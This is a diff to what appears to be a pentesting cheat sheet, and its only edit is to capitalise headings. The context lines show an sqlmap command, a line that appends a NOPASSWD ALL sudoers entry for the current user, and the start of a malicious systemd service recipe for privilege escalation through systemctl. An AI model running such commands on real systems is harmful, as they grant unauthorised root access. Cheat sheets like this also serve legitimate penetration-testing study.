@@ -259,7 +259,7 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 
 ## Sudo
 
-### Sudo version
+### Sudo Version
 ```bash
 # Check the sudo version
 sudo --version
@@ -290,7 +290,7 @@ echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 
 ## Systemctl
 
-### Sudo/SUID permissions on `systemctl`
+### Sudo/SUID Permissions on `systemctl`
 ```bash    
 # 1. Create a malicious service file (e.g., root.service) in the current directory
 cat << EOF > root.service
@@ -317,7 +317,7 @@ sudo systemctl start root
 ```
 > - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
 
-### Sudo permissions on `systemctl status`
+### Sudo Permissions on `systemctl status`
 ```bash
 # 0. Check the systemd version
 # (If the systemd version is >= 247, the probability of exploitation is lower due to a patch for CVE-2023-26604)
